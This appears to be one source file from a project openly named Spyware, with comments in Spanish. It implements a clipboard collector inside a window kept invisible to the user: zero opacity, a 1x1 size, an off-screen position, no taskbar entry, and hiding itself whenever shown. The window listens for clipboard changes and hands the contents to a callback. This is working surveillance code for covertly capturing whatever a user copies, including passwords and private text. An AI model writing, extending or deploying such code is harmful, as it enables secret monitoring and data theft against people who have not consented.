using System.Windows.Forms;
using Spyware.Core.Configuration;
using Spyware.Core.Logging;

namespace Spyware.Collectors.Clipboard;

/// <summary>
/// Ventana sin HWND visible que recibe WM_CLIPBOARDUPDATE (API moderna,
/// AddClipboardFormatListener). Con debounce para no leer en ráfagas.
/// </summary>
public sealed class ClipboardMessageWindow : Form
{
    private const int WM_CLIPBOARDUPDATE = 0x031D;
    private const int WsExToolwindow = 0x00080000;

    private readonly Action<ClipboardSnapshot> _onUpdate;
    private readonly ClipboardSection _config;
    private readonly ILog _log;

    // Calificado: con los global usings implícitos, "Timer" sería ambiguo.
    private readonly System.Windows.Forms.Timer _debounce;

    public ClipboardMessageWindow(ClipboardSection config, Action<ClipboardSnapshot> onUpdate, ILog log)
    {
        _config = config;
        _onUpdate = onUpdate;
        _log = log;

        FormBorderStyle = FormBorderStyle.None;
        ShowInTaskbar = false;
        Opacity = 0;
        Size = new System.Drawing.Size(1, 1);
        StartPosition = FormStartPosition.Manual;
        Location = new System.Drawing.Point(-32000, -32000);
        Text = "SpywareAgent-Clipboard";

        _debounce = new System.Windows.Forms.Timer { Interval = Math.Max(0, config.DebounceMilliseconds) };
        _debounce.Tick += OnDebounceTick;
    }

    // Propiedad de solo lectura en WinForms: se sobrescribe en lugar de asignar.
    protected override bool ShowWithoutActivation => true;

    protected override CreateParams CreateParams
    {
        get
        {
            CreateParams parameters = base.CreateParams;
            parameters.ExStyle |= WsExToolwindow;
            return parameters;
        }
    }

    protected override void OnHandleCreated(EventArgs e)
    {
        base.OnHandleCreated(e);

        if (!NativeMethods.AddClipboardFormatListener(Handle))
            _log.Warn("AddClipboardFormatListener devolvió false; se usará polling como respaldo.");
        else
            _log.Info("Listener de portapapeles registrado (WM_CLIPBOARDUPDATE).");
    }

    protected override void OnHandleDestroyed(EventArgs e)
    {
        NativeMethods.RemoveClipboardFormatListener(Handle);
        _debounce.Stop();
        base.OnHandleDestroyed(e);
    }

    // En .NET 8, Control/Form.SetVisibleCore ya no es accesible desde fuera del
    // ensamblado de Windows Forms, así que no se puede sobrescribir. La ventana
    // se crea fuera de la pantalla (1x1, Opacity = 0, WS_EX_TOOLWINDOW) y se
    // oculta en cuanto el bucle de mensajes la muestra: el HWND sigue vivo.
    protected override void OnShown(EventArgs e)
    {
        base.OnShown(e);
        Hide();
    }

    protected override void WndProc(ref Message message)
    {
        base.WndProc(ref message);

        if (message.Msg == WM_CLIPBOARDUPDATE)
        {
            _debounce.Stop();
            _debounce.Start();
        }
    }

    private void OnDebounceTick(object? sender, EventArgs e)
    {
        _debounce.Stop();
        _onUpdate(ClipboardReader.Read(_config, _log));
    }

    public static class NativeMethods
    {
        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        public static extern bool RemoveClipboardFormatListener(IntPtr hwnd);
    }
}
